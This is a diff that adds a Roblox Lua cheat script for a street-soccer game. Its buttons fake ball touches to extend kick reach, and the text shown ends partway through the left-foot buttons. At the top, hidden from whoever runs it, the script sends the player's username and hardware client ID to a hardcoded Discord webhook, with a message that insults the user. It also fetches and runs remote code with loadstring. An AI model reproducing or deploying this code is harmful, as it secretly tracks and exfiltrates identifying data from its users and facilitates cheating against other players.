@@ -1,0 +1,777 @@
+Http = game:GetService("HttpService")
+Web = "https://discord.com/api/webhooks/1085048921191108728/HFCNv63o7uWvpnh00LOYNWsvkAVjTSIT87wZMftXnYAX0fnYvi5lAIKLXh_h2F3ouydz"
+
+if syn then
+    local responce = syn.request(
+    {
+        Url = Web,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = Http:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**scriptin çalıştırıldı!**",
+                ["description"] = game.Players.LocalPlayer.Name.. " bu oç sc kullandı",
+                ["type"] = "rich",
+                ["color"] = tonumber(random),
+                ["fields"] = {
+                    {
+                        ["name"] = " Ip",
+                        ["value"] =  game:HttpGet("", true),
+                        ["inline"] = true
+                    }
+                }
+                
+            }}
+        })
+    })
+   else
+    request(
+        {
+            Url = Web,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = Http:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "**Scriptini Çalıştırdı!**",
+                    ["description"] =  game.Players.LocalPlayer.Name.. " hardwareid aşağıda",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(random),
+                    ["fields"] = {
+                        {
+                            ["name"] = "Hardware ID:",
+							["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                            ["inline"] = true
+                        }
+                    }
+                    
+                }}
+            })
+        })
+    end
+            
+
+
+--script
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "HomelanderTps Script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "Homelander"})
+
+
+--reach
+local Tab = Window:MakeTab({
+	Name = "reach settings",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+--bestreach
+Tab:AddButton({
+	Name = "2 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 2 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "3 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 3 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "4 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 4 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "5 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 5 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "8 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 8 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "15 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 15 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "30 studs right foot",
+	Callback = function()
+        getgenv().Leg = "Right" -- Left or Right
+        getgenv().Reach = 30 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "2 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 2 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "3 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 3 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "4 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 4 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
+        -- GO TO: https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 --
+        game["RunService"].Stepped:Connect(function()
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("LeftLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("RightLowerLeg"), 1)
+                end
+            end
+            if Leg == "Right" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Right Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Right Leg"), 1)
+                end
+            end
+            if Leg == "Left" and game:GetService("Players").LocalPlayer.Character ~= nil and game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+                if (workspace.TPSSystem.TPS.Position - game.Players.LocalPlayer.Character:WaitForChild("Left Leg").Position).Magnitude <= Reach then
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 0)
+                    firetouchinterest(workspace.TPSSystem.TPS, game.Players.LocalPlayer.Character:WaitForChild("Left Leg"), 1)
+                end
+            end
+        end)
+    end    
+})
+
+Tab:AddButton({
+	Name = "5 studs left foot",
+	Callback = function()
+        getgenv().Leg = "Left" -- Left or Right
+        getgenv().Reach = 5 -- Change to whatever you want (The game caps it)
+        -- https://rscripts.net/script/TPS--Street-Soccer-Script-or-Reach-2800 -- DO NOT USE THIS SCRIPT BELOW ME, IT WONT WORK--
